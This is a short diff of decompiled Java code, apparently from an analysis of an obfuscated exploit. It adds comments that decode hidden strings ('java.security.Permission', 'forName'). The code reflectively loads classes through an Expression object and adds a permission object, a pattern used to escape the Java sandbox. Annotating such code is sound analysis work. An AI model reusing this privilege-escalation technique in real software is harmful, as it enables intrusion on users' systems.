@@ -38,6 +38,7 @@
 /*    */   public static Object levelUp(String paramString1, String paramString2) throws Exception {
 /* 39 */     Class clazz = getCl(paramString1);
 /* 40 */     Object object = getCl(paramString2).newInstance();
+                // a  java.security.Permission
 /* 41 */     Method method = object.getClass().getMethod(Issue.csfn("777a7777") + "dd", new Class[] { getCl(Issue.csfn("77j7a7v7a7.7s7e7c7u7r7i7t8y.8P8e48r8m8i8s8s8i8o8n8")) });
 /* 42 */     method.invoke(object, new Object[] { clazz.newInstance() });
 /* 43 */     return object;
@@ -46,6 +47,7 @@
 /*    */ 
 /*    */   
 /*    */   static Class getCl(String paramString) throws Exception {
+             //  forNa  me
 /* 49 */     String str1 = "8f28o8r8N8a888883", str2 = "8888888888m3e";
 /* 50 */     Expression expression = new Expression(Class.class, Issue.csfn(str1 + str2), new Object[] { paramString });
 /*    */     try {
